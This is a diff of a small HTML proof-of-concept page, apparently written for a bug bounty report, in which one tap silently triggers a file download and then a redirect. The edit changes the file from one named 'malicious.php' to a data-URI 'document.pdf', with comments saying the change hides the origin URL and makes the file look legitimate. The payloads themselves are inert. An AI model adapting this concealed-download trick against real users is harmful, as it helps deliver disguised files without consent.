@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>iOS Forced Download POC</title>
+  <title>Concealed Download</title>
   <style>
     body {
       height: 100vh;
@@ -24,39 +24,33 @@
 
 <h1>
   Tap anywhere.<br>
-  iOS will download a file and then navigate to another page.
+  The file will be downloaded without an origin URL showing.
 </h1>
 
 <script>
 document.addEventListener('click', () => {
-  // File content to be "downloaded"
-  const payload = `<?php echo "owned"; ?>`;
+  // Create "legitimate" file content (e.g., a PDF-like string, image data)
+  const payload = `%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Title (Test PDF) /Author (Your Name) >>\nendobj\n...`; 
 
-  // Creating a Blob object with MIME type
-  const blob = new Blob([payload], {
-    type: 'application/octet-stream'
-  });
+  // Create a Data URI for the content (this does not expose an external URL)
+  const dataUri = `data:application/pdf;base64,${btoa(payload)}`;
 
-  // Creating an object URL for the Blob
-  const url = URL.createObjectURL(blob);
-
-  // Creating an <a> tag to trigger the download
+  // Create an <a> tag to trigger the download
   const a = document.createElement('a');
-  a.href = url;
-  a.download = 'malicious.php'; // Suggested file name for download
+  a.href = dataUri;
+  a.download = 'document.pdf'; // Suggested filename to make it look legitimate
   document.body.appendChild(a);
-  a.click(); // Simulating the click to trigger the download
+  a.click(); // Trigger the download
 
-  // Cleanup after the download is triggered
+  // Clean up after triggering the download
   setTimeout(() => {
-    URL.revokeObjectURL(url); // Revoke the URL after the download
     a.remove(); // Clean up the <a> element
   }, 1000);
 
-  // Optional: Navigation after a delay (simulating a "chain")
+  // Optional: Redirect after a delay (for "chaining")
   setTimeout(() => {
-    location.href = 'https://hackerone.com'; // Redirecting after 3 seconds
-  }, 3000); // Delay for navigation after download
+    location.href = 'https://hackerone.com'; // Redirect to a different page after 3 seconds
+  }, 3000); // Delay navigation
 }, { once: true });
 </script>
 
